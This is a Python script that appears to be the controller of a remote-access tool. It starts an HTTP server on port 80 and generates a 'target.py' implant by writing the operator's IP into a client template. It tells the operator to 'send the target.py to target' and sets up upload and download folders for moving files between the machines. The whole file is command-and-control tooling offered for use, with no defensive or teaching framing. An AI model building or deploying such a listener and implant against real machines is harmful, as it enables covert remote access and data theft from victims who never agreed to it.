#!/usr/bin/python3 
from server import HTTPHandler
from http.server import HTTPServer
import socket as s
import argparse
import os

class Controller():
    def __init__(self,ip):
        self.ip=ip

    def start(self):
        try:
            httpd = HTTPServer((self.ip, 80), HTTPHandler)
            print("taget.py is created, Now send the target.py to target")
            print(f"Server started on {self.ip}:80\nWaiting for target to connect...")
            self.setTargetFile()
            self.makeFolders()
            httpd.serve_forever()
        except PermissionError as e:
            print (f"Cant' start the server on {self.ip}:80 \nRUN WITH SUDO")
        except Exception as e:
            print(str(e))

    def setTargetFile(self):
        try:
            with open('client.py', 'r') as file :
                filedata = file.read()
            find='server=None'
            replace=f'server = "http://{self.ip}"'
            filedata = filedata.replace(find, replace)
            with open('target.py', 'w') as file:
                file.write(filedata)
        except PermissionError as e:
            print("You need write permission better try out with sudo")

        except Exception as e:
            print(str(e)) 

    def makeFolders(self):
        try:
            if not os.path.exists("uploads"):
                os.mkdir("uploads")  
            if not os.path.exists("downloads"):
                os.mkdir("downloads")  
        except Exception as e:
            print(str(e))
    
def arguments():
    defaultIP=s.gethostbyname(s.gethostname())
    parser = argparse.ArgumentParser(description='Get input for IP and port')
    parser.add_argument('-i', '--ip', metavar='192.168.1.1', help='The IP which the Web Server runs', default=defaultIP)
    args = parser.parse_args()
    return args.ip


def main():
    ip=arguments()
    obj=Controller(ip)
    try:
        obj.start()
    except KeyboardInterrupt:
        print("You Have Closed the service")
    except Exception as e:
        print (str(e))
          
if __name__ == '__main__':
    main()